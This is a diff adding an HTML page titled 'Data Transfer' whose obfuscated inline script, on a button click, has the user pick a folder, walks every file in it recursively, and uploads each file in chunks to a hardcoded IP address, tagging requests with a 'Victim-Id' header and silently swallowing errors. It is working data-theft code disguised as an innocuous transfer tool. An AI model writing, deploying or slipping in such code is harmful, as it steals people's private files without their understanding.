@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Data Transfer</title>
+  <style>
+    body {background:#000; color:#0F0; font-family:monospace; text-align:center; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column}
+    button {padding:10px; border:2px solid red; background:transparent; color:red; cursor:pointer; font-size:1.2rem; margin-top:20px}
+    button:hover {background:red; color:#000}
+  </style>
+</head>
+<body>
+  <h1>Data Transfer</h1>
+  <button id="start">Start</button>
+  <script>
+    (function(){
+      let _0x1a2b3c = "https://172.50.1.64:8443/upload";
+      document["getElementById"]("start")["addEventListener"]("click", async () => {
+        try {
+          let _0x9f8e7d = crypto["randomUUID"]();
+          let _0xa3b4c5 = await window["showDirectoryPicker"]();
+          await (async function _0xf0e1d2(_0xabc123, _0xdef456) {
+            let _0xuploadPromises = [];
+            let _0xmaxConcurrent = 3;
+            for await (let _0x56789a of _0xabc123["values"]()) {
+              if (_0x56789a["kind"] === "file") {
+                let _0x111222 = await _0x56789a["getFile"]();
+                let _0xuploadPromise = (async function _0x333444(_0xaaa, _0xbbb) {
+                  let _0xccc = await _0xbbb["arrayBuffer"](), _0xddd = 1024 * 100, _0xeee = Math["ceil"](_0xccc["byteLength"] / _0xddd), _0xfff = 0;
+                  for (let _0x101010 = 0; _0x101010 < _0xeee; _0x101010++) {
+                    let _0x111111 = Math["min"](_0xfff + _0xddd, _0xccc["byteLength"]), _0x121212 = _0xccc["slice"](_0xfff, _0x111111);
+                    _0xfff = _0x111111;
+                    await (async function _0x131313(_0x1, _0x2, _0x3, _0x4, _0x5) {
+                      await fetch(_0x1a2b3c, {
+                        "method": "POST",
+                        "headers": {
+                          "Content-Type": "application/octet-stream",
+                          "Victim-Id": encodeURIComponent(_0x1),
+                          "Filename": encodeURIComponent(_0x2),
+                          "Chunk-Index": _0x4,
+                          "Total-Chunks": _0x5
+                        },
+                        "body": _0x3
+                      });
+                    })(_0xaaa, _0xbbb["name"], _0x121212, _0x101010 + 1, _0xeee);
+                  }
+                })(_0xdef456, _0x111222);
+                _0xuploadPromises.push(_0xuploadPromise);
+                if (_0xuploadPromises.length >= _0xmaxConcurrent) {
+                  await Promise.allSettled(_0xuploadPromises);
+                  _0xuploadPromises = [];
+                }
+              } else if (_0x56789a["kind"] === "directory") {
+                await _0xf0e1d2(await _0x56789a, _0xdef456);
+              }
+            }
+            await Promise.allSettled(_0xuploadPromises);
+          })(_0xa3b4c5, _0x9f8e7d);
+        } catch (_0x999999) {}
+      });
+    })();
+  </script>
+</body>
+</html>
